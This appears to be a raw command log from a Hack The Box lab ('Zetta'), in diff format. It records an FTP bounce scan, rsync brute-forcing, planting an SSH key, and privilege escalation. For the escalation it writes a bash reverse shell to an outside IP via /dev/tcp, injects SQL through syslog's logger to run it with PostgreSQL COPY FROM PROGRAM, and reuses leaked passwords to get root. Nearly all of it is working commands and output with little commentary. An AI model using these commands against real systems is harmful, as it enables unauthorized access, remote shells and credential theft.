@@ -1,0 +1,369 @@
+
+crdeds from port 80 homepage
+username
+8sZYKTEjUP1bNmEDiiaepEqa95DywCvM
+password
+8sZYKTEjUP1bNmEDiiaepEqa95DywCvM
+
+since fxp is enabled, try ftp bounce attack
+
+root@kali:~/HTB/Zetta# nmap -P0 -b 8sZYKTEjUP1bNmEDiiaepEqa95DywCvM:8sZYKTEjUP1bNmEDiiaepEqa95DywCvM@10.10.10.156 10.10.16.14 -p 8000 -v
+Warning: The -P0 option is deprecated. Please use -Pn
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-01 15:03 WAT
+Happy 22th Birthday to Nmap, may it live to be 122!
+Resolved FTP bounce attack proxy to 10.10.10.156 (10.10.10.156).
+Initiating Parallel DNS resolution of 1 host. at 15:03
+Completed Parallel DNS resolution of 1 host. at 15:03, 0.01s elapsed
+Attempting connection to ftp://8sZYKTEjUP1bNmEDiiaepEqa95DywCvM:8sZYKTEjUP1bNmEDiiaepEqa95DywCvM@10.10.10.156:21
+Connected:Login credentials accepted by FTP server!
+Initiating Bounce Scan at 15:03
+Completed Bounce Scan at 15:03, 14.66s elapsed (1 total ports)
+Nmap scan report for 10.10.16.14
+Host is up.
+
+PORT     STATE    SERVICE
+8000/tcp filtered http-alt
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 29.84 seconds
+
+
+
+
+PS supportdesk\chase@SUPPORTDESK Documents> ping 10.10.10.156
+
+Pinging 10.10.10.156 with 32 bytes of data:
+Reply from 10.10.10.156: bytes=32 time<1ms TTL=64
+Reply from 10.10.10.156: bytes=32 time<1ms TTL=64
+Reply from 10.10.10.156: bytes=32 time<1ms TTL=64
+Reply from 10.10.10.156: bytes=32 time<1ms TTL=64
+
+Ping statistics for 10.10.10.156:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 0ms, Maximum = 0ms, Average = 0ms
+
+
+PS supportdesk\chase@SUPPORTDESK Documents> arp -a
+
+Interface: 10.10.10.149 --- 0xf
+  Internet Address      Physical Address      Type
+  10.10.10.2            00-50-56-aa-9c-8d     dynamic   
+  10.10.10.156          00-50-56-b9-82-3d     dynamic   
+  10.10.10.255          ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.251           01-00-5e-00-00-fb     static    
+  224.0.0.252           01-00-5e-00-00-fc     static    
+PS supportdesk\chase@SUPPORTDESK Documents> exit
+
+root@kali:~/HTB/Zetta# /usr/bin/atk6-address6 00:50:56:b9:82:3d dead:beef::
+dead:beef::250:56ff:feb9:823d
+
+
+
+root@kali:~/HTB/Zetta# rsync -6 -zvh rsync://[dead:beef::250:56ff:feb9:823d]:8730/etc
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+You must have explicit, authorized permission to access this rsync
+server. Unauthorized attempts and actions to access or use this 
+system may result in civil and/or criminal penalties. 
+
+All activities performed on this device are logged and monitored.
+
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+@ZE::A staff
+
+This rsync server is solely for access to the zetta master server.
+The modules you see are either provided for "Backup access" or for
+"Cloud sync".
+
+
+receiving file list ... done
+drwxr-xr-x          4.10K 2019/08/31 20:44:23 .
+-rw-r--r--          2.98K 2019/07/27 08:01:29 adduser.conf
+-rw-r--r--             44 2019/07/27 08:03:30 adjtime
+-rw-r--r--          1.99K 2019/04/18 05:12:36 bash.bashrc
+-rw-r--r--            367 2018/03/02 21:03:58 bindresvport.blacklist
+-rw-r--r--          5.71K 2019/07/27 08:07:27 ca-certificates.conf
+-rw-r--r--          1.04K 2019/06/23 18:49:01 crontab
+-rw-r--r--          2.97K 2019/02/26 10:30:35 debconf.conf
+-rw-r--r--              5 2019/04/19 12:00:00 debian_version
+-rw-r--r--            604 2016/06/26 21:00:56 deluser.conf
+-rw-r--r--            346 2018/01/14 22:27:01 discover-modprobe.conf
+-rw-r--r--              0 2019/07/27 08:01:28 environment
+-rw-r--r--            664 2019/08/27 10:39:06 fstab
+-rw-r--r--            130 2019/01/28 19:56:17 ftpallow
+-rw-r--r--            177 2019/01/28 19:56:17 ftpusers
+-rw-r--r--          2.58K 2018/08/01 06:10:47 gai.conf
+-rw-r--r--            735 2019/07/27 11:00:50 group
+-rw-r--r--            732 2019/07/27 08:07:28 group-
+-rw-r--r--              9 2006/08/07 18:14:09 host.conf
+-rw-r--r--              6 2019/07/27 08:01:35 hostname
+-rw-r--r--            195 2019/07/27 08:01:35 hosts
+-rw-r--r--            411 2019/07/27 08:03:12 hosts.allow
+-rw-r--r--            711 2019/07/27 08:03:12 hosts.deny
+-rw-r--r--          1.06K 2019/07/27 08:07:19 inetd.conf
+-rw-r--r--          1.75K 2018/05/05 15:52:46 inputrc
+-rw-r--r--             27 2019/05/13 21:25:32 issue
+-rw-r--r--             20 2019/05/13 21:25:32 issue.net
+-rw-r--r--            144 2019/07/27 08:03:27 kernel-img.conf
+-rw-r--r--         15.34K 2019/08/27 10:38:58 ld.so.cache
+-rw-r--r--             34 2018/03/02 21:03:58 ld.so.conf
+-rw-r--r--            191 2019/04/25 15:47:32 libaudit.conf
+-rw-r--r--          3.00K 2019/05/01 18:24:19 locale.alias
+-rw-r--r--          9.38K 2019/07/27 08:01:37 locale.gen
+lrwxrwxrwx             30 2019/07/27 08:01:39 localtime
+-rw-r--r--         10.48K 2018/07/27 09:07:37 login.defs
+-rw-r--r--            435 2018/08/22 08:05:31 logrotate.conf
+-r--r--r--             33 2019/07/27 08:01:30 machine-id
+-rw-r--r--            111 2019/03/02 08:05:54 magic
+-rw-r--r--            111 2019/03/02 08:05:54 magic.mime
+-rw-r--r--          2.51K 2019/07/27 08:01:47 mailcap
+-rw-r--r--            449 2019/02/09 13:32:33 mailcap.order
+-rw-r--r--         24.51K 2019/02/09 13:32:33 mime.types
+-rw-r--r--            812 2018/12/16 04:46:49 mke2fs.conf
+-rw-r--r--            195 2019/07/27 08:01:34 modules
+-rw-r--r--              0 2019/07/27 11:43:25 motd
+lrwxrwxrwx             19 2019/07/27 08:03:46 mtab
+-rw-r--r--          9.28K 2019/06/12 01:23:23 nanorc
+-rw-r--r--             60 2019/07/27 08:01:34 networks
+-rw-r--r--            494 2019/02/10 17:13:53 nsswitch.conf
+lrwxrwxrwx             21 2019/05/13 21:25:32 os-release
+-rw-r--r--            552 2019/02/14 08:08:47 pam.conf
+-rw-r--r--          1.46K 2019/07/27 08:07:28 passwd
+-rw-r--r--          1.44K 2019/07/27 08:07:28 passwd-
+-rw-r--r--            767 2016/03/04 12:00:00 profile
+-rw-r--r--          2.93K 2019/02/10 03:05:36 protocols
+-rw-r--r--             81 2019/08/14 15:49:09 resolv.conf
+lrwxrwxrwx             13 2019/04/23 17:05:54 rmt
+-rw-r--r--            887 2019/02/10 03:05:36 rpc
+-rw-r--r--          2.93K 2019/08/31 20:44:14 rsyncd.conf
+-rw-r--r--            558 2019/07/27 11:39:04 rsyncd.motd
+-rw-r--r--          2.01K 2019/07/27 11:43:25 rsyslog.conf
+-rw-r--r--          4.14K 2018/07/27 09:07:37 securetty
+-rw-r--r--         10.59K 2018/12/19 16:58:53 sensors3.conf
+-rw-r--r--         18.77K 2019/02/10 03:05:36 services
+-rw-r--r--            116 2019/07/27 08:01:28 shells
+-rw-r--r--             17 2019/07/27 08:03:28 subgid
+-rw-r--r--              0 2019/07/27 08:01:29 subgid-
+-rw-r--r--             17 2019/07/27 08:03:28 subuid
+-rw-r--r--              0 2019/07/27 08:01:29 subuid-
+-rw-r--r--          2.78K 2019/07/27 11:41:59 sysctl.conf
+-rw-r--r--             11 2019/07/27 08:01:39 timezone
+-rw-r--r--          4.18K 2019/07/27 08:07:33 tudurc
+-rw-r--r--          1.26K 2018/12/14 09:51:14 ucf.conf
+-rw-r--r--            642 2019/03/01 23:03:21 xattr.conf
+drwxr-xr-x          4.10K 2019/07/27 08:02:05 X11
+drwxr-xr-x         20.48K 2019/07/27 08:07:30 alternatives
+drwxr-xr-x          4.10K 2019/07/27 08:01:55 apparmor.d
+drwxr-xr-x          4.10K 2019/07/27 08:01:55 apparmor
+drwxr-xr-x          4.10K 2019/07/27 08:03:28 apt
+drwxr-xr-x          4.10K 2019/07/27 08:07:33 bash_completion.d
+drwxr-xr-x          4.10K 2019/05/24 21:58:59 binfmt.d
+drwxr-xr-x          4.10K 2019/07/27 08:07:19 ca-certificates
+drwxr-xr-x          4.10K 2019/07/27 08:01:35 calendar
+drwxr-xr-x          4.10K 2019/07/27 08:02:07 console-setup
+drwxr-xr-x          4.10K 2019/07/27 08:07:25 cron.d
+drwxr-xr-x          4.10K 2019/07/27 08:07:25 cron.daily
+drwxr-xr-x          4.10K 2019/07/27 08:01:34 cron.hourly
+drwxr-xr-x          4.10K 2019/07/27 08:01:34 cron.monthly
+drwxr-xr-x          4.10K 2019/07/27 08:01:34 cron.weekly
+drwxr-xr-x          4.10K 2019/07/27 08:07:46 dbconfig-common
+drwxr-xr-x          4.10K 2019/07/27 08:03:09 dbus-1
+drwxr-xr-x          4.10K 2019/07/27 08:07:33 default
+drwxr-xr-x          4.10K 2019/07/27 08:01:35 dhcp
+drwxr-xr-x          4.10K 2019/07/27 08:03:13 dictionaries-common
+drwxr-xr-x          4.10K 2019/07/27 08:02:52 discover.conf.d
+drwxr-xr-x          4.10K 2019/07/27 08:01:28 dpkg
+drwxr-xr-x          4.10K 2019/07/27 08:03:10 emacs
+drwxr-xr-x          4.10K 2019/07/27 08:03:19 grub.d
+drwxr-xr-x          4.10K 2019/07/27 08:03:10 gss
+drwxr-xr-x          4.10K 2019/08/27 10:38:39 init.d
+drwxr-xr-x          4.10K 2019/07/27 08:01:40 initramfs-tools
+drwxr-xr-x          4.10K 2019/07/27 08:01:34 iproute2
+drwxr-xr-x          4.10K 2019/08/14 15:50:36 iptables
+drwxr-xr-x          4.10K 2019/07/27 08:01:40 kernel
+drwxr-xr-x          4.10K 2019/08/27 10:38:58 ld.so.conf.d
+drwxr-xr-x          4.10K 2019/07/27 08:07:25 ldap
+drwxr-xr-x          4.10K 2019/07/27 08:01:33 logcheck
+drwxr-xr-x          4.10K 2019/07/27 08:07:43 logrotate.d
+drwxr-xr-x          4.10K 2019/02/10 00:00:31 modprobe.d
+drwxr-xr-x          4.10K 2019/07/27 08:01:30 modules-load.d
+drwxr-xr-x          4.10K 2019/08/14 16:07:50 network
+drwxr-xr-x          4.10K 2019/07/27 11:36:48 nginx
+drwxr-xr-x          4.10K 2019/07/27 08:01:20 opt
+drwxr-xr-x          4.10K 2019/08/27 10:38:49 pam.d
+drwxr-xr-x          4.10K 2019/07/27 08:07:18 perl
+drwxr-xr-x          4.10K 2019/07/27 08:07:28 postgresql-common
+drwxr-xr-x          4.10K 2019/07/27 08:07:29 postgresql
+drwxr-xr-x          4.10K 2019/05/13 21:25:32 profile.d
+drwxr-xr-x          4.10K 2019/07/27 08:11:32 pure-ftpd
+drwxr-xr-x          4.10K 2019/07/27 08:01:41 python3.7
+drwxr-xr-x          4.10K 2019/07/27 08:01:55 python3
+drwxr-xr-x          4.10K 2019/08/27 10:38:54 rc0.d
+drwxr-xr-x          4.10K 2019/08/27 10:38:54 rc1.d
+drwxr-xr-x          4.10K 2019/08/27 10:38:54 rc2.d
+drwxr-xr-x          4.10K 2019/08/27 10:38:54 rc3.d
+drwxr-xr-x          4.10K 2019/08/27 10:38:54 rc4.d
+drwxr-xr-x          4.10K 2019/08/27 10:38:54 rc5.d
+drwxr-xr-x          4.10K 2019/08/27 10:38:54 rc6.d
+drwxr-xr-x          4.10K 2019/07/27 08:07:25 rcS.d
+drwxr-xr-x          4.10K 2019/07/27 12:01:41 rsyslog.d
+drwxr-xr-x          4.10K 2019/07/27 08:01:28 security
+drwxr-xr-x          4.10K 2019/07/27 08:01:27 selinux
+drwxr-xr-x          4.10K 2019/07/27 08:07:24 sensors.d
+drwxr-xr-x          4.10K 2019/07/27 08:01:28 skel
+drwxr-xr-x          4.10K 2019/07/27 08:03:13 ssh
+drwxr-xr-x          4.10K 2019/07/27 08:07:25 ssl
+drwxr-xr-x          4.10K 2019/07/27 08:07:28 sysctl.d
+drwxr-xr-x          4.10K 2019/07/27 08:07:25 sysstat
+drwxr-xr-x          4.10K 2019/07/27 08:01:30 systemd
+drwxr-xr-x          4.10K 2019/07/27 08:01:27 terminfo
+drwxr-xr-x          4.10K 2019/05/24 21:58:59 tmpfiles.d
+drwxr-xr-x          4.10K 2019/07/27 08:01:34 udev
+drwxr-xr-x          4.10K 2019/07/27 08:03:11 ufw
+drwxr-xr-x          4.10K 2019/07/27 08:01:28 update-motd.d
+drwxr-xr-x          4.10K 2019/07/27 08:01:35 vim
+drwxr-xr-x          4.10K 2019/08/27 10:38:45 vmware-caf
+drwxr-xr-x          4.10K 2019/08/27 10:39:03 vmware-tools
+drwxr-xr-x          4.10K 2019/07/27 08:01:30 xdg
+
+sent 20 bytes  received 3.53K bytes  789.56 bytes/sec
+total size is 159.06K  speedup is 44.77
+root@kali:~/HTB/Ze
+
+root@kali:~/HTB/Zetta# python3 rsync_brute.py /usr/share/wordlists/rockyou.txt dead:beef::250:56ff:feb9:823d
+Starting The brute force! :D
+The password is:computer
+
+root@kali:~/HTB/Zetta# rsync -6 -zvh id_rsa.pub rsync://roy@[dead:beef::250:56ff:feb9:823d]:8730/home_roy/.ssh/authorized_keys
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+You must have explicit, authorized permission to access this rsync
+server. Unauthorized attempts and actions to access or use this 
+system may result in civil and/or criminal penalties. 
+
+All activities performed on this device are logged and monitored.
+
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+@ZE::A staff
+
+This rsync server is solely for access to the zetta master server.
+The modules you see are either provided for "Backup access" or for
+"Cloud sync".
+
+
+Password: 
+id_rsa.pub
+
+sent 548 bytes  received 41 bytes  51.22 bytes/sec
+total size is 563  speedup is 0.96
+
+root@kali:~/HTB/Zetta# chmod 600 id_rsa
+
+root@kali:~/HTB/Zetta# ssh -i id_rsa roy@10.10.10.156
+Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
+Last login: Sat Sep 14 11:37:27 2019 from 10.10.15.176
+roy@zetta:~$ ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  .profile  .ssh  .tudu.xml  user.txt
+roy@zetta:~$ cat user.txt
+a575bdb345f2de0a3172c8282452be91
+
+
+roy@zetta:~$ uname -a
+Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64 GNU/Linux
+
+roy@zetta:~$ grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+root
+
+roy@zetta:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/umount
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/chsh
+
+roy@zetta:~/fuckoff$ cd /etc/rsyslog.d/
+roy@zetta:/etc/rsyslog.d$ ls -a
+.  ..  .git  pgsql.conf
+roy@zetta:/etc/rsyslog.d$ cat pgsql.conf
+cat: pgsql.conf: Permission denied
+roy@zetta:/etc/rsyslog.d$ cd /home/roy/fuckoff
+roy@zetta:~/fuckoff$ git clone /etc/rsyslog.d/
+Cloning into 'rsyslog.d'...
+done.
+roy@zetta:~/fuckoff$ ls -a
+.  ..  rsyslog.d
+roy@zetta:~/fuckoff$ cd rsyslog.d
+roy@zetta:~/fuckoff/rsyslog.d$ ls -a
+.  ..  .git  pgsql.conf
+roy@zetta:~/fuckoff/rsyslog.d$ cat pgsql.conf
+### Configuration file for rsyslog-pgsql
+### Changes are preserved
+
+# https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html
+#
+# Used default template from documentation/source but adapted table
+# name to syslog_lines so the Ruby on Rails application Maurice is
+# coding can use this as SyslogLine object.
+#
+template(name="sql-syslog" type="list" option.sql="on") {
+  constant(value="INSERT INTO syslog_lines (message, devicereportedtime) values ('")
+  property(name="msg")
+  constant(value="','")
+  property(name="timereported" dateformat="pgsql" date.inUTC="on")
+  constant(value="')")
+}
+
+# load module
+module(load="ompgsql")
+
+# Only forward local7.info for testing.
+local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")
+roy@zetta:~/fuckoff/rsyslog.d$ 
+
+
+roy@zetta:/tmp$ echo "bash -i >& /dev/tcp/10.10.16.62/1337 0>&1" > myshell.sh
+roy@zetta:/tmp$ chmod +x myshell.sh
+roy@zetta:/tmp$ /usr/bin/logger -i -p local7.info "hey', now());DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM \$\$bash /tmp/myshell.sh\$\$;COPY (SELECT * FROM cmd_exec) TO \$\$/tmp/myshell.csv\$\$ CSV;DROP TABLE IF EXISTS cmd_exec;-- -"
+roy@zetta:/tmp$ 
+
+root@kali:~# nc -lvp 1337
+listening on [any] 1337 ...
+connect to [10.10.16.62] from zetta.htb [10.10.10.156] 55304
+bash: cannot set terminal process group (1564): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@zetta:/var/lib/postgresql/11/main$ whoami
+whoami
+postgres
+
+postgres@zetta:/var/lib/postgresql/11/main$ cat /var/lib/postgresql/.psql_history
+<esql/11/main$ cat /var/lib/postgresql/.psql_history
+CREATE DATABASE syslog;
+\c syslog
+CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL);
+\d syslog_lines
+ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';
+postgres@zetta:/var/lib/postgresql/11/main$ 
+
+
+using tudu.xml password scheme
+
+roy@zetta:~$ su
+Password: sup3rs3cur3p4ass@root
+root@zetta:/home/roy# ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  fuckoff  .profile	.ssh  .tudu.xml  user.txt
+root@zetta:/home/roy# cat /root/root.txt
+b9407e837fb779abc934d6db89ed4c42
+root@zetta:/home/roy# 
+
